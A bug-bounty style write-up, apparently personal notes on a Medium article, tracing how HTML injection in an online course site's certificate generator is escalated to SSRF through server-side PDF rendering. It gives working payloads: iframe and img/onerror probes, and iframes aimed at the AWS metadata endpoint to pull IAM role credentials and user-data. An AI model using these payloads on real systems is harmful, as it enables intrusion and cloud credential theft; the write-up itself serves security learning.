
2025-07-11 22:53

Source: #web 

We have a website which sells online courses. If possible try buying a course & start testing from inside. Try the usual stuff like bypassing payments, accessing locked content, checking for IDORs, and looking for exposed assets.

after completing the course ,the site offered me a certificate generator to download my certificate.

## The Certificate Generator Feature

the page will let you enter:
- Your **name**
- Your **title**
- (Optionally) a quote or message
then you click **“generate”**, and the server gives you back a **PDF or PNG file** with your info on a nice certificate template.

the request body looked something like this:
```json
{  
  "name": "name",  
  "title": "title",  
  "quote": "quote "  
}
```

As always, I started by testing all input parameters for injection. The `title` parameter was the parameter that have no input sanitization.

I replaced it with a simple HTML tag:
```json
"title": "<i>ahmed</i>"
```

Since there was no input sanitization, the HTML payload got rendered in both pdf and image in _italic_ font.

on trying a few more
```json
"title": "<b>Red Team Member</b>"

"title": "<iframe src='https://sub.0xxnum.fun/test'></iframe>"

"title": "<img src=x onerror=alert(1)>"
```

- `<b>` and `<iframe>` **rendered**
- `<script>` and `onerror=` **did not execute**

This meant we had **HTML [[Injection]]**, but **not XSS**.

## Identifying SSRF

next, i wanted to test if this rendering process would actually **fetch resources** from the `iframe`.

so i modified the payload:
```json
"title": "<iframe src='http://sub.tarek.dev/probe'></iframe>"
```
and set up a listener on my end (Burp Collaborator / [[netcat]] / web server).

> I received a DNS and HTTP hit to listener from the IP address of the web application server.

Now i confirmed that **the server was rendering HTML and loading iframe content from our input**.  
> that’s **SSRF via HTML Injection** in the PDF rendering flow.

## Going for [[AWS]] metadata 

Having [[Server-side request forgery (SSRF)]] is one thing, but proving its impact is another. Since the server was making outbound HTTP requests, I suspected it might be hosted on **AWS** — and if so, I wanted to reach the **Instance Metadata Service (IMDS)**.

To begin the attack, I injected a new payload designed to access the metadata endpoint:
```json
"title": "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'></iframe>"
```

The generated PDF included the IAM role name, my-app-instance-role, confirming that the server was running on an AWS EC2 instance with IMDSv1 enabled. IMDSv1 is particularly vulnerable because it does not require authentication tokens, unlike IMDSv2.

I then crafted another payload to target the specific IAM role and leak temporary credentials:
```json
"title": "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-instance-role'></iframe>"
```

The resulting PDF contained sensitive data, including:
- **AccessKeyId**
- **SecretAccessKey**
- **Token**

these were **temporary AWS credentials,** depending on the permissions tied to that IAM role, this could’ve granted access to other AWS services like S3, DynamoDB, etc.

Besides AWS access keys, see if there is any sensitive data in the user-data IMDS endpoint
 ```
http://169.254.169.254/latest/user-data
```

the `user-data` section often includes bootstrapping scripts, environment variables, or even hardcoded secrets in plaintext.

## What really happened

how does putting an iframe in a PDF result in the **server** sending HTTP requests?

when i submit my name, title, and quote, the server builds an HTML version of the certificate and passes it to a rendering engine like `wkhtmltopdf`, `puppeteer`, or another headless browser tool.  
those tools process the full HTML just like a normal browser would. that means they fetch images, iframes, stylesheets, and more — **automatically** — to fully render the page before converting it to a PDF or PNG.

so when you include this:
```html
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
```

the rendering tool on the server sees that iframe and tries to fetch the content from that IP address.  
and since `169.254.169.254` is the AWS metadata IP, this turns into an SSRF from **inside** the cloud environment.

your input is not just sitting in the PDF — it is being **processed and loaded** before the final file is created.

this is the core of the vulnerability.  
you’re abusing HTML injection, not to trigger JavaScript or do XSS, but to trick the server into making internal HTTP requests by rendering your iframe or other HTML tags.

### References
[How I Escalated Simple HTML Injection to SSRF via PDF Rendering | by Ahmed Tarek | Jul, 2025 | Medium](https://medium.com/@0x_xnum/how-i-escalated-simple-html-injection-to-ssrf-via-pdf-rendering-682ea94b3194)